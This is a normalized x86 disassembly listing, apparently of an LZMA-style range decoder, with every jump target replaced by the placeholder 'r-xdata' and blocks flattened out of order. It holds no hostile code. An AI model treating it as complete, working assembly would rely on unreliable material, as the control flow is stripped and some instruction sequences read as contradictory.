lea eax [ edx + ecx + 0x1 ]
mov [ ebp - 0x34 ] eax
mov ecx [ ebp - 0x68 ]
and ecx [ ebp - 0x8c ]
mov [ ebp - 0x68 ] ecx
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x4 ] eax
mov ecx 0x800
sub ecx [ ebp - 0x8 ]
shr ecx 0x5
add ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x80 ]
mov [ edx ] cx
mov eax [ ebp - 0x34 ]
add eax [ ebp - 0x34 ]
mov [ ebp - 0x34 ] eax
mov ecx [ ebp - 0x8c ]
not ecx
and ecx [ ebp - 0x68 ]
mov [ ebp - 0x68 ] ecx
jmp r-xdata
mov edx [ ebp - 0x34 ]
mov eax [ ebp - 0x1c ]
movzx ecx [ eax + edx * 2 ]
mov [ ebp - 0x8 ] ecx
cmp [ ebp - 0x4 ] 0x1000000
jae r-xdata
jmp r-xdata
cmp [ ebp - 0x34 ] 0x100
jb r-xdata
mov ecx [ ebp - 0x4 ]
shr ecx 0xb
imul ecx [ ebp - 0x8 ]
mov [ ebp - 0x10 ] ecx
mov edx [ ebp - 0xc ]
cmp edx [ ebp - 0x10 ]
jae r-xdata
mov edx [ ebp - 0x4 ]
shl edx 0x8
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0xc ]
shl eax 0x8
mov ecx [ ebp - 0x18 ]
movzx edx [ ecx ]
or eax edx
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x18 ]
add eax 0x1
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x44 ]
mov [ ebp - 0x64 ] eax
mov ecx [ ebp - 0x84 ]
mov [ ebp - 0x44 ] ecx
cmp [ ebp - 0x2c ] 0x7
jae r-xdata
mov [ ebp - 0xd4 ] 0x0
mov eax [ ebp - 0x60 ]
mov [ ebp - 0xd4 ] eax
jmp r-xdata
mov edx [ ebp - 0x4 ]
sub edx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0xc ]
sub eax [ ebp - 0x10 ]
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0x8 ]
shr ecx 0x5
mov edx [ ebp - 0x8 ]
sub edx ecx
mov eax [ ebp - 0x28 ]
mov ecx [ ebp - 0x38 ]
mov [ ecx + eax * 2 ] dx
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x28 ]
lea ecx [ eax + edx + 0x1 ]
mov [ ebp - 0x28 ] ecx
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x4 ] eax
mov ecx 0x800
sub ecx [ ebp - 0x8 ]
shr ecx 0x5
add ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x38 ]
mov [ eax + edx * 2 ] cx
mov ecx [ ebp - 0x28 ]
add ecx [ ebp - 0x28 ]
mov [ ebp - 0x28 ] ecx
jmp r-xdata
mov eax [ ebp - 0x94 ]
shl eax 0x1
mov [ ebp - 0x94 ] eax
mov ecx [ ebp - 0x94 ]
and ecx [ ebp - 0x68 ]
mov [ ebp - 0x8c ] ecx
mov edx [ ebp - 0x68 ]
mov eax [ ebp - 0x1c ]
lea ecx [ eax + edx * 2 ]
mov edx [ ebp - 0x8c ]
lea eax [ ecx + edx * 2 ]
mov ecx [ ebp - 0x34 ]
lea edx [ eax + ecx * 2 ]
mov [ ebp - 0x80 ] edx
mov eax [ ebp - 0x80 ]
movzx ecx [ eax ]
mov [ ebp - 0x8 ] ecx
cmp [ ebp - 0x4 ] 0x1000000
jae r-xdata
mov edx [ ebp - 0x54 ]
add edx [ ebp - 0x30 ]
mov al [ ebp - 0x34 ]
mov [ edx ] al
mov ecx [ ebp - 0x30 ]
add ecx 0x1
mov [ ebp - 0x30 ] ecx
mov edx [ ebp - 0x40 ]
add edx 0x1
mov [ ebp - 0x40 ] edx
jmp r-xdata
cmp [ ebp - 0x34 ] 0x100
jb r-xdata
mov ecx [ ebp - 0x4 ]
sub ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0xc ]
sub edx [ ebp - 0x10 ]
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x8 ]
shr eax 0x5
mov ecx [ ebp - 0x8 ]
sub ecx eax
mov edx [ ebp - 0x1c ]
mov [ edx ] cx
mov eax [ ebp - 0x7c ]
mov [ ebp - 0x84 ] eax
mov ecx [ ebp - 0x6c ]
mov [ ebp - 0x7c ] ecx
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x4 ] eax
mov ecx 0x800
sub ecx [ ebp - 0x8 ]
shr ecx 0x5
add ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x1c ]
mov [ edx ] cx
mov eax [ ebp - 0x6c ]
mov [ ebp - 0x84 ] eax
jmp r-xdata
mov [ ebp - 0xd0 ] 0xb
mov [ ebp - 0xd0 ] 0x8
jmp r-xdata
mov [ ebp - 0xb8 ] 0xb
mov [ ebp - 0xb8 ] 0x9
jmp r-xdata
mov ecx [ ebp - 0x30 ]
sub ecx [ ebp - 0x44 ]
add ecx [ ebp - 0xd4 ]
mov edx [ ebp - 0x54 ]
add edx [ ebp - 0x30 ]
mov eax [ ebp - 0x54 ]
mov cl [ eax + ecx ]
mov [ edx ] cl
mov edx [ ebp - 0x30 ]
add edx 0x1
mov [ ebp - 0x30 ] edx
mov eax [ ebp - 0x40 ]
add eax 0x1
mov [ ebp - 0x40 ] eax
cmp [ ebp - 0x2c ] 0x7
jae r-xdata
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x38 ]
movzx ecx [ eax + edx * 2 ]
mov [ ebp - 0x8 ] ecx
cmp [ ebp - 0x4 ] 0x1000000
jae r-xdata
mov eax [ ebp - 0x28 ]
sub eax [ ebp - 0x70 ]
mov [ ebp - 0x28 ] eax
mov ecx [ ebp - 0x28 ]
add ecx [ ebp - 0x88 ]
mov [ ebp - 0x28 ] ecx
cmp [ ebp - 0x2c ] 0xc
jb r-xdata
mov edx [ ebp - 0x28 ]
cmp edx [ ebp - 0x70 ]
jb r-xdata
mov eax [ ebp - 0x30 ]
cmp eax [ ebp - 0x98 ]
jae r-xdata
mov edx [ ebp - 0x64 ]
mov [ ebp - 0x6c ] edx
mov edx [ ebp - 0xd0 ]
mov [ ebp - 0x2c ] edx
mov eax [ ebp - 0x3c ]
add eax 0xa68
mov [ ebp - 0x1c ] eax
mov ecx [ ebp - 0xb8 ]
mov [ ebp - 0x2c ] ecx
jmp r-xdata
mov ecx [ ebp - 0x28 ]
add ecx 0x2
mov [ ebp - 0x28 ] ecx
mov edx [ ebp - 0x98 ]
cmp edx [ ebp - 0x30 ]
jne r-xdata
cmp [ ebp - 0x28 ] 0x4
jae r-xdata
cmp [ ebp - 0x4 ] 0x1000000
jae r-xdata
mov ecx [ ebp - 0x18 ]
cmp ecx [ ebp + 0x8 ]
jb r-xdata
mov eax [ ebp - 0x98 ]
sub eax [ ebp - 0x30 ]
mov [ ebp - 0xb4 ] eax
mov ecx [ ebp - 0xb4 ]
cmp ecx [ ebp - 0x28 ]
jae r-xdata
mov eax 0x1
jmp r-xdata
mov [ ebp - 0xc0 ] 0x3
mov edx [ ebp - 0x28 ]
mov [ ebp - 0xc0 ] edx
jmp r-xdata
mov ecx [ ebp - 0x24 ]
mov edx [ ebp - 0x18 ]
mov [ ecx + 0x18 ] edx
mov eax [ ebp - 0x24 ]
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x1c ] ecx
mov edx [ ebp - 0x24 ]
mov eax [ ebp - 0xc ]
mov [ edx + 0x20 ] eax
mov ecx [ ebp - 0x24 ]
mov edx [ ebp - 0x28 ]
mov [ ecx + 0x48 ] edx
mov eax [ ebp - 0x24 ]
mov ecx [ ebp - 0x30 ]
mov [ eax + 0x24 ] ecx
mov edx [ ebp - 0x24 ]
mov eax [ ebp - 0x40 ]
mov [ edx + 0x2c ] eax
mov ecx 0x4
imul ecx ecx 0x0
mov edx [ ebp - 0x24 ]
mov eax [ ebp - 0x44 ]
mov [ edx + ecx + 0x38 ] eax
mov ecx 0x4
shl ecx 0x0
mov edx [ ebp - 0x24 ]
mov eax [ ebp - 0x64 ]
mov [ edx + ecx + 0x38 ] eax
mov ecx 0x4
shl ecx 0x1
mov edx [ ebp - 0x24 ]
mov eax [ ebp - 0x6c ]
mov [ edx + ecx + 0x38 ] eax
mov ecx 0x4
imul ecx ecx 0x3
mov edx [ ebp - 0x24 ]
mov eax [ ebp - 0x7c ]
mov [ edx + ecx + 0x38 ] eax
mov ecx [ ebp - 0x24 ]
mov edx [ ebp - 0x2c ]
mov [ ecx + 0x34 ] edx
xor eax eax
mov edx [ ebp - 0x4 ]
shl edx 0x8
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0xc ]
shl eax 0x8
mov ecx [ ebp - 0x18 ]
movzx edx [ ecx ]
or eax edx
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x18 ]
add eax 0x1
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x40 ]
and eax [ ebp - 0xd8 ]
mov [ ebp - 0x78 ] eax
mov ecx [ ebp - 0x2c ]
shl ecx 0x4
mov edx [ ebp - 0x3c ]
lea eax [ edx + ecx * 2 ]
mov ecx [ ebp - 0x78 ]
lea edx [ eax + ecx * 2 ]
mov [ ebp - 0x1c ] edx
mov eax [ ebp - 0x1c ]
movzx ecx [ eax ]
mov [ ebp - 0x8 ] ecx
cmp [ ebp - 0x4 ] 0x1000000
jae r-xdata
mov eax [ ebp - 0x28 ]
mov [ ebp - 0xbc ] eax
mov edx [ ebp - 0xb4 ]
mov [ ebp - 0xbc ] edx
jmp r-xdata
mov edx [ ebp - 0x4 ]
shr edx 0xb
imul edx [ ebp - 0x8 ]
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x10 ]
jae r-xdata
mov eax [ ebp - 0x4 ]
shl eax 0x8
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0xc ]
shl ecx 0x8
mov edx [ ebp - 0x18 ]
movzx eax [ edx ]
or ecx eax
mov [ ebp - 0xc ] ecx
mov ecx [ ebp - 0x18 ]
add ecx 0x1
mov [ ebp - 0x18 ] ecx
mov eax [ ebp - 0xc0 ]
shl eax 0x6
mov ecx [ ebp - 0x3c ]
lea edx [ ecx + eax * 2 + 0x360 ]
mov [ ebp - 0x1c ] edx
mov [ ebp - 0x14 ] 0x1
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x1c ]
movzx edx [ ecx + eax * 2 ]
mov [ ebp - 0x8 ] edx
cmp [ ebp - 0x4 ] 0x1000000
jae r-xdata
mov [ ebp - 0xc4 ] 0x0
mov eax [ ebp - 0x60 ]
mov [ ebp - 0xc4 ] eax
jmp r-xdata
mov ecx [ ebp - 0xbc ]
mov [ ebp - 0x50 ] ecx
mov edx [ ebp - 0x30 ]
cmp edx [ ebp - 0x44 ]
jae r-xdata
mov eax [ ebp - 0x4 ]
sub eax [ ebp - 0x10 ]
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0xc ]
sub ecx [ ebp - 0x10 ]
mov [ ebp - 0xc ] ecx
mov edx [ ebp - 0x8 ]
shr edx 0x5
mov eax [ ebp - 0x8 ]
sub eax edx
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x1c ]
mov [ edx + ecx * 2 ] ax
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x14 ]
lea edx [ ecx + eax + 0x1 ]
mov [ ebp - 0x14 ] edx
mov ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] ecx
mov edx 0x800
sub edx [ ebp - 0x8 ]
shr edx 0x5
add edx [ ebp - 0x8 ]
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x1c ]
mov [ ecx + eax * 2 ] dx
mov edx [ ebp - 0x14 ]
add edx [ ebp - 0x14 ]
mov [ ebp - 0x14 ] edx
jmp r-xdata
mov edx [ ebp - 0x54 ]
add edx [ ebp - 0x30 ]
mov eax [ ebp - 0x54 ]
add eax [ ebp - 0x58 ]
mov cl [ eax ]
mov [ edx ] cl
mov edx [ ebp - 0x30 ]
add edx 0x1
mov [ ebp - 0x30 ] edx
mov eax [ ebp - 0x58 ]
add eax 0x1
mov [ ebp - 0x58 ] eax
mov ecx [ ebp - 0x58 ]
cmp ecx [ ebp - 0x60 ]
jne r-xdata
mov edx [ ebp - 0x54 ]
add edx [ ebp - 0x30 ]
mov [ ebp - 0x5c ] edx
mov eax [ ebp - 0x58 ]
sub eax [ ebp - 0x30 ]
mov [ ebp - 0xdc ] eax
mov ecx [ ebp - 0x5c ]
add ecx [ ebp - 0x50 ]
mov [ ebp - 0xe4 ] ecx
mov edx [ ebp - 0x30 ]
add edx [ ebp - 0x50 ]
mov [ ebp - 0x30 ] edx
mov ecx [ ebp - 0x30 ]
sub ecx [ ebp - 0x44 ]
add ecx [ ebp - 0xc4 ]
mov [ ebp - 0x58 ] ecx
mov edx [ ebp - 0x40 ]
add edx [ ebp - 0x50 ]
mov [ ebp - 0x40 ] edx
mov eax [ ebp - 0x28 ]
sub eax [ ebp - 0x50 ]
mov [ ebp - 0x28 ] eax
mov ecx [ ebp - 0x58 ]
add ecx [ ebp - 0x50 ]
cmp ecx [ ebp - 0x60 ]
ja r-xdata
mov edx [ ebp - 0x4 ]
shr edx 0xb
imul edx [ ebp - 0x8 ]
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x10 ]
jae r-xdata
mov eax [ ebp - 0x4 ]
shl eax 0x8
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0xc ]
shl ecx 0x8
mov edx [ ebp - 0x18 ]
movzx eax [ edx ]
or ecx eax
mov [ ebp - 0xc ] ecx
mov ecx [ ebp - 0x18 ]
add ecx 0x1
mov [ ebp - 0x18 ] ecx
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x1c ]
movzx edx [ ecx + eax * 2 ]
mov [ ebp - 0x8 ] edx
cmp [ ebp - 0x4 ] 0x1000000
jae r-xdata
mov edx [ ebp - 0x50 ]
sub edx 0x1
mov [ ebp - 0x50 ] edx
jne r-xdata
mov [ ebp - 0x58 ] 0x0
mov eax [ ebp - 0x5c ]
add eax [ ebp - 0xdc ]
mov ecx [ ebp - 0x5c ]
mov dl [ eax ]
mov [ ecx ] dl
mov eax [ ebp - 0x5c ]
add eax 0x1
mov [ ebp - 0x5c ] eax
mov ecx [ ebp - 0x5c ]
cmp ecx [ ebp - 0xe4 ]
jne r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
sub eax [ ebp - 0x10 ]
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0xc ]
sub ecx [ ebp - 0x10 ]
mov [ ebp - 0xc ] ecx
mov edx [ ebp - 0x8 ]
shr edx 0x5
mov eax [ ebp - 0x8 ]
sub eax edx
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x1c ]
mov [ edx + ecx * 2 ] ax
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x14 ]
lea edx [ ecx + eax + 0x1 ]
mov [ ebp - 0x14 ] edx
mov ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] ecx
mov edx 0x800
sub edx [ ebp - 0x8 ]
shr edx 0x5
add edx [ ebp - 0x8 ]
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x1c ]
mov [ ecx + eax * 2 ] dx
mov edx [ ebp - 0x14 ]
add edx [ ebp - 0x14 ]
mov [ ebp - 0x14 ] edx
jmp r-xdata
mov edx [ ebp - 0x4 ]
shr edx 0xb
imul edx [ ebp - 0x8 ]
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x10 ]
jae r-xdata
mov eax [ ebp - 0x4 ]
shl eax 0x8
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0xc ]
shl ecx 0x8
mov edx [ ebp - 0x18 ]
movzx eax [ edx ]
or ecx eax
mov [ ebp - 0xc ] ecx
mov ecx [ ebp - 0x18 ]
add ecx 0x1
mov [ ebp - 0x18 ] ecx
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x1c ]
movzx edx [ ecx + eax * 2 ]
mov [ ebp - 0x8 ] edx
cmp [ ebp - 0x4 ] 0x1000000
jae r-xdata
mov eax [ ebp - 0x4 ]
sub eax [ ebp - 0x10 ]
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0xc ]
sub ecx [ ebp - 0x10 ]
mov [ ebp - 0xc ] ecx
mov edx [ ebp - 0x8 ]
shr edx 0x5
mov eax [ ebp - 0x8 ]
sub eax edx
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x1c ]
mov [ edx + ecx * 2 ] ax
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x14 ]
lea edx [ ecx + eax + 0x1 ]
mov [ ebp - 0x14 ] edx
mov ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] ecx
mov edx 0x800
sub edx [ ebp - 0x8 ]
shr edx 0x5
add edx [ ebp - 0x8 ]
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x1c ]
mov [ ecx + eax * 2 ] dx
mov edx [ ebp - 0x14 ]
add edx [ ebp - 0x14 ]
mov [ ebp - 0x14 ] edx
jmp r-xdata
mov edx [ ebp - 0x4 ]
shr edx 0xb
imul edx [ ebp - 0x8 ]
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x10 ]
jae r-xdata
mov eax [ ebp - 0x4 ]
shl eax 0x8
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0xc ]
shl ecx 0x8
mov edx [ ebp - 0x18 ]
movzx eax [ edx ]
or ecx eax
mov [ ebp - 0xc ] ecx
mov ecx [ ebp - 0x18 ]
add ecx 0x1
mov [ ebp - 0x18 ] ecx
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x1c ]
movzx edx [ ecx + eax * 2 ]
mov [ ebp - 0x8 ] edx
cmp [ ebp - 0x4 ] 0x1000000
jae r-xdata
mov eax [ ebp - 0x4 ]
sub eax [ ebp - 0x10 ]
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0xc ]
sub ecx [ ebp - 0x10 ]
mov [ ebp - 0xc ] ecx
mov edx [ ebp - 0x8 ]
shr edx 0x5
mov eax [ ebp - 0x8 ]
sub eax edx
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x1c ]
mov [ edx + ecx * 2 ] ax
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x14 ]
lea edx [ ecx + eax + 0x1 ]
mov [ ebp - 0x14 ] edx
mov ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] ecx
mov edx 0x800
sub edx [ ebp - 0x8 ]
shr edx 0x5
add edx [ ebp - 0x8 ]
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x1c ]
mov [ ecx + eax * 2 ] dx
mov edx [ ebp - 0x14 ]
add edx [ ebp - 0x14 ]
mov [ ebp - 0x14 ] edx
jmp r-xdata
mov edx [ ebp - 0x4 ]
shr edx 0xb
imul edx [ ebp - 0x8 ]
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x10 ]
jae r-xdata
mov eax [ ebp - 0x4 ]
shl eax 0x8
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0xc ]
shl ecx 0x8
mov edx [ ebp - 0x18 ]
movzx eax [ edx ]
or ecx eax
mov [ ebp - 0xc ] ecx
mov ecx [ ebp - 0x18 ]
add ecx 0x1
mov [ ebp - 0x18 ] ecx
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x1c ]
movzx edx [ ecx + eax * 2 ]
mov [ ebp - 0x8 ] edx
cmp [ ebp - 0x4 ] 0x1000000
jae r-xdata
mov eax [ ebp - 0x4 ]
sub eax [ ebp - 0x10 ]
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0xc ]
sub ecx [ ebp - 0x10 ]
mov [ ebp - 0xc ] ecx
mov edx [ ebp - 0x8 ]
shr edx 0x5
mov eax [ ebp - 0x8 ]
sub eax edx
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x1c ]
mov [ edx + ecx * 2 ] ax
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x14 ]
lea edx [ ecx + eax + 0x1 ]
mov [ ebp - 0x14 ] edx
mov ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] ecx
mov edx 0x800
sub edx [ ebp - 0x8 ]
shr edx 0x5
add edx [ ebp - 0x8 ]
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x1c ]
mov [ ecx + eax * 2 ] dx
mov edx [ ebp - 0x14 ]
add edx [ ebp - 0x14 ]
mov [ ebp - 0x14 ] edx
jmp r-xdata
mov edx [ ebp - 0x4 ]
shr edx 0xb
imul edx [ ebp - 0x8 ]
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x10 ]
jae r-xdata
mov eax [ ebp - 0x4 ]
shl eax 0x8
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0xc ]
shl ecx 0x8
mov edx [ ebp - 0x18 ]
movzx eax [ edx ]
or ecx eax
mov [ ebp - 0xc ] ecx
mov ecx [ ebp - 0x18 ]
add ecx 0x1
mov [ ebp - 0x18 ] ecx
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x1c ]
movzx edx [ ecx + eax * 2 ]
mov [ ebp - 0x8 ] edx
cmp [ ebp - 0x4 ] 0x1000000
jae r-xdata
mov eax [ ebp - 0x4 ]
sub eax [ ebp - 0x10 ]
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0xc ]
sub ecx [ ebp - 0x10 ]
mov [ ebp - 0xc ] ecx
mov edx [ ebp - 0x8 ]
shr edx 0x5
mov eax [ ebp - 0x8 ]
sub eax edx
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x1c ]
mov [ edx + ecx * 2 ] ax
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x14 ]
lea edx [ ecx + eax + 0x1 ]
mov [ ebp - 0x14 ] edx
mov ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] ecx
mov edx 0x800
sub edx [ ebp - 0x8 ]
shr edx 0x5
add edx [ ebp - 0x8 ]
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x1c ]
mov [ ecx + eax * 2 ] dx
mov edx [ ebp - 0x14 ]
add edx [ ebp - 0x14 ]
mov [ ebp - 0x14 ] edx
jmp r-xdata
mov eax [ ebp - 0x6c ]
mov [ ebp - 0x7c ] eax
mov ecx [ ebp - 0x64 ]
mov [ ebp - 0x6c ] ecx
mov edx [ ebp - 0x44 ]
mov [ ebp - 0x64 ] edx
mov eax [ ebp - 0x14 ]
add eax 0x1
mov [ ebp - 0x44 ] eax
cmp [ ebp - 0x74 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x14 ]
mov [ ebp - 0xa0 ] ecx
mov edx [ ebp - 0x14 ]
shr edx 0x1
sub edx 0x1
mov [ ebp - 0x48 ] edx
mov eax [ ebp - 0x14 ]
and eax 0x1
or eax 0x2
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0xa0 ] 0xe
jae r-xdata
mov eax [ ebp - 0x14 ]
sub eax 0x40
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x4
jb r-xdata
mov edx [ ebp - 0x14 ]
cmp edx [ ebp - 0x74 ]
jb r-xdata
mov ecx [ ebp - 0x14 ]
cmp ecx [ ebp - 0x40 ]
jb r-xdata
mov ecx [ ebp - 0x48 ]
sub ecx 0x4
mov [ ebp - 0x48 ] ecx
mov edx [ ebp - 0x14 ]
mov ecx [ ebp - 0x48 ]
shl edx cl
mov [ ebp - 0x14 ] edx
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x3c ]
lea edx [ ecx + eax * 2 + 0x560 ]
mov eax [ ebp - 0xa0 ]
shl eax 0x1
sub edx eax
sub edx 0x2
mov [ ebp - 0x1c ] edx
mov [ ebp - 0x90 ] 0x1
mov [ ebp - 0x4c ] 0x1
cmp [ ebp - 0x2c ] 0x13
jae r-xdata
mov eax 0x1
jmp r-xdata
jmp r-xdata
mov eax 0x1
jmp r-xdata
mov ecx [ ebp - 0x4 ]
shr ecx 0x1
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0xc ]
sub edx [ ebp - 0x4 ]
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0xc ]
shr eax 0x1f
xor ecx ecx
sub ecx eax
mov [ ebp - 0xa4 ] ecx
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xa4 ]
lea ecx [ eax + edx * 2 + 0x1 ]
mov [ ebp - 0x14 ] ecx
mov edx [ ebp - 0x4 ]
and edx [ ebp - 0xa4 ]
add edx [ ebp - 0xc ]
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x48 ]
sub eax 0x1
mov [ ebp - 0x48 ] eax
jne r-xdata
mov edx [ ebp - 0x4 ]
shl edx 0x8
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0xc ]
shl eax 0x8
mov ecx [ ebp - 0x18 ]
movzx edx [ ecx ]
or eax edx
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x18 ]
add eax 0x1
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
shr eax 0xb
imul eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
mov ecx [ ebp - 0xc ]
cmp ecx [ ebp - 0x10 ]
jae r-xdata
mov ecx [ ebp - 0x4 ]
shl ecx 0x8
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0xc ]
shl edx 0x8
mov eax [ ebp - 0x18 ]
movzx ecx [ eax ]
or edx ecx
mov [ ebp - 0xc ] edx
mov edx [ ebp - 0x18 ]
add edx 0x1
mov [ ebp - 0x18 ] edx
mov [ ebp - 0xac ] 0xa
mov [ ebp - 0xac ] 0x7
jmp r-xdata
cmp [ ebp - 0x4 ] 0x1000000
jae r-xdata
mov ecx [ ebp - 0x3c ]
add ecx 0x644
mov [ ebp - 0x1c ] ecx
mov edx [ ebp - 0x14 ]
shl edx 0x4
mov [ ebp - 0x14 ] edx
mov [ ebp - 0x20 ] 0x1
mov eax [ ebp - 0x20 ]
mov ecx [ ebp - 0x1c ]
movzx edx [ ecx + eax * 2 ]
mov [ ebp - 0x8 ] edx
cmp [ ebp - 0x4 ] 0x1000000
jae r-xdata
mov ecx [ ebp - 0x4 ]
sub ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0xc ]
sub edx [ ebp - 0x10 ]
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x8 ]
shr eax 0x5
mov ecx [ ebp - 0x8 ]
sub ecx eax
mov edx [ ebp - 0x4c ]
mov eax [ ebp - 0x1c ]
mov [ eax + edx * 2 ] cx
mov ecx [ ebp - 0x4c ]
mov edx [ ebp - 0x4c ]
lea eax [ edx + ecx + 0x1 ]
mov [ ebp - 0x4c ] eax
mov ecx [ ebp - 0x14 ]
or ecx [ ebp - 0x90 ]
mov [ ebp - 0x14 ] ecx
mov edx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] edx
mov eax 0x800
sub eax [ ebp - 0x8 ]
shr eax 0x5
add eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x4c ]
mov edx [ ebp - 0x1c ]
mov [ edx + ecx * 2 ] ax
mov eax [ ebp - 0x4c ]
add eax [ ebp - 0x4c ]
mov [ ebp - 0x4c ] eax
jmp r-xdata
mov eax [ ebp - 0xac ]
mov [ ebp - 0x2c ] eax
mov edx [ ebp - 0x4 ]
shr edx 0xb
imul edx [ ebp - 0x8 ]
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x10 ]
jae r-xdata
mov eax [ ebp - 0x4 ]
shl eax 0x8
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0xc ]
shl ecx 0x8
mov edx [ ebp - 0x18 ]
movzx eax [ edx ]
or ecx eax
mov [ ebp - 0xc ] ecx
mov ecx [ ebp - 0x18 ]
add ecx 0x1
mov [ ebp - 0x18 ] ecx
mov ecx [ ebp - 0x4c ]
mov edx [ ebp - 0x1c ]
movzx eax [ edx + ecx * 2 ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x4 ] 0x1000000
jae r-xdata
jmp r-xdata
mov edx [ ebp - 0x90 ]
shl edx 0x1
mov [ ebp - 0x90 ] edx
mov eax [ ebp - 0x48 ]
sub eax 0x1
mov [ ebp - 0x48 ] eax
jne r-xdata
mov eax [ ebp - 0x4 ]
sub eax [ ebp - 0x10 ]
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0xc ]
sub ecx [ ebp - 0x10 ]
mov [ ebp - 0xc ] ecx
mov edx [ ebp - 0x8 ]
shr edx 0x5
mov eax [ ebp - 0x8 ]
sub eax edx
mov ecx [ ebp - 0x20 ]
mov edx [ ebp - 0x1c ]
mov [ edx + ecx * 2 ] ax
mov eax [ ebp - 0x20 ]
mov ecx [ ebp - 0x20 ]
lea edx [ ecx + eax + 0x1 ]
mov [ ebp - 0x20 ] edx
mov eax [ ebp - 0x14 ]
or eax 0x1
mov [ ebp - 0x14 ] eax
mov ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] ecx
mov edx 0x800
sub edx [ ebp - 0x8 ]
shr edx 0x5
add edx [ ebp - 0x8 ]
mov eax [ ebp - 0x20 ]
mov ecx [ ebp - 0x1c ]
mov [ ecx + eax * 2 ] dx
mov edx [ ebp - 0x20 ]
add edx [ ebp - 0x20 ]
mov [ ebp - 0x20 ] edx
